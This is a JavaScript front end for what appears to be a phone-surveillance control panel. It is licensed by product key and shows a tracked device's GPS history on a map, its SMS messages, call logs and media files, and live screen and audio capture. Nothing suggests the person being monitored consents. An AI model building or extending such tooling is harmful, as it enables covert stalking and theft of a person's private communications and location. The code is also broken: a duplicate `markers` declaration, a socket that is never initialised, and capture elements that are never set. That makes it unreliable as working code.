const token = localStorage.getItem('token');
if (!token) window.location = '/';

let currentDevice = null;
let socket = null;
let map = null;
let markers = [];
let screenCaptureVideo = null;
let audioCapture = null;

async function apiGet(path) {
  const r = await fetch('/api/' + path, { headers: { Authorization: 'Bearer ' + token } });
  if (!r.ok) throw new Error('api error');
  return r.json();
}

async function init() {
  const userBox = document.getElementById('userBox');
  const licenseBox = document.getElementById('licenseBox');
  
  // Fetch devices
  let devices = [];
  try { devices = await apiGet('devices'); } catch(e){ console.error(e); }
  userBox.innerText = 'Devices: ' + (devices.length || 0);

  // Initialize map
  initMap();

  // UI Handlers
  document.getElementById('btnLogout').addEventListener('click', () => { 
    localStorage.removeItem('token'); 
    window.location = '/'; 
  });
  
  // Event handlers for buttons
  document.getElementById('btnLocations').addEventListener('click', async () => {
    showPanel('panel-locations'); 
    await loadLocations(devices[0] ? devices[0].deviceId : null);
    if (devices[0]) joinDeviceRoom(devices[0].deviceId);
  });
  
  document.getElementById('btnSms').addEventListener('click', async () => { 
    showPanel('panel-sms'); 
    await loadSms(); 
  });
  
  document.getElementById('btnCalls').addEventListener('click', async () => { 
    showPanel('panel-calls'); 
    await loadCalls(); 
  });
  
  document.getElementById('btnMedia').addEventListener('click', async () => { 
    showPanel('panel-media'); 
    await loadMedia(); 
  });
  
  document.getElementById('btnProductKey').addEventListener('click', () => { 
    window.location = '/productkey.html'; 
  });

  document.getElementById('btnScreenCapture').addEventListener('click', () => {
    if (devices[0]) {
      showPanel('panel-screen-capture');
      joinDeviceRoom(devices[0].deviceId);
    } else {
      alert("No device found");
    }
  });

  document.getElementById('btnAudioCapture').addEventListener('click', () => {
    if (devices[0]) {
      showPanel('panel-audio-capture');
      joinDeviceRoom(devices[0].deviceId);
    } else {
      alert("No device found");
    }
  });
}

function showPanel(id) {
  document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
  document.getElementById(id).classList.remove('hidden');
}

let markers = [];

function initMap() {
  map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
}

async function loadLocations(deviceId) {
  try {
    const qs = deviceId ? '?deviceId=' + encodeURIComponent(deviceId) : '';
    const list = await apiGet('data/location' + qs);
    document.getElementById('locList').innerHTML = '';
    markers.forEach(m => map.removeLayer(m));
    markers = [];
    list.forEach(l => {
      const li = document.createElement('li');
      li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} — ${new Date(l.timestamp).toLocaleString()}`;
      document.getElementById('locList').appendChild(li);
      const m = L.marker([l.lat, l.lon]).addTo(map);
      m.bindPopup(`<b>${new Date(l.timestamp).toLocaleString()}</b><br/>${l.lat.toFixed(6)}, ${l.lon.toFixed(6)}<br/><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=${l.lat},${l.lon}">Abrir no Google Maps</a>`);
      markers.push(m);
    });
    if (markers.length) {
      const group = new L.featureGroup(markers);
      map.fitBounds(group.getBounds().pad(0.2));
    }
  } catch (e) { console.error(e); }
}

async function loadSms() {
  try {
    const list = await apiGet('data/sms');
    const el = document.getElementById('smsList'); el.innerHTML = '';
    list.forEach(s => {
      const li = document.createElement('li');
      li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`;
      el.appendChild(li);
    });
  } catch (e) { console.error(e); }
}

async function loadCalls() {
  try {
    const list = await apiGet('data/call');
    const el = document.getElementById('callList'); el.innerHTML = '';
    list.forEach(c => {
      const li = document.createElement('li');
      li.textContent = `${c.number || 'unknown'} - ${c.state} (${c.duration || ''}) ${new Date(c.timestamp).toLocaleString()}`;
      el.appendChild(li);
    });
  } catch (e) { console.error(e); }
}

async function loadMedia() {
  try {
    const list = await apiGet('media');
    const el = document.getElementById('mediaList'); el.innerHTML = '';
    list.forEach(m => {
      const li = document.createElement('li');
      const a = document.createElement('a');
      a.href = '/api/media/' + m._id;
      a.textContent = (m.filename || m._id) + ' (' + (m.type || '') + ')';
      a.target = '_blank';
      li.appendChild(a);
      el.appendChild(li);
    });
  } catch (e) { console.error(e); }
}

window.addEventListener('load', init);

function initSocket() {
  if (socket) return;
  socket = io();

  socket.on('connect', () => {
    console.log('socket connected', socket.id);
  });

  socket.on('screenCapture', (frame) => {
    if (!screenCaptureVideo) return;
    const url = URL.createObjectURL(frame);
    screenCaptureVideo.src = url;
  });

  socket.on('audioCapture', (audioData) => {
    if (!audioCapture) return;
    const audioBlob = new Blob([audioData], { type: 'audio/mp3' });
    const audioUrl = URL.createObjectURL(audioBlob);
    audioCapture.src = audioUrl;
  });

  socket.on('disconnect', () => {
    console.log('socket disconnected');
  });
}

function joinDeviceRoom(deviceId) {
  if (!socket) return;
  if (!deviceId) return;
  if (currentDevice && currentDevice === deviceId) return; // Already joined this device
  if (currentDevice) {
    socket.emit('leaveDevice', currentDevice);
  }
  currentDevice = deviceId;
  socket.emit('joinDevice', deviceId);
  console.log('joined device room', deviceId);
}
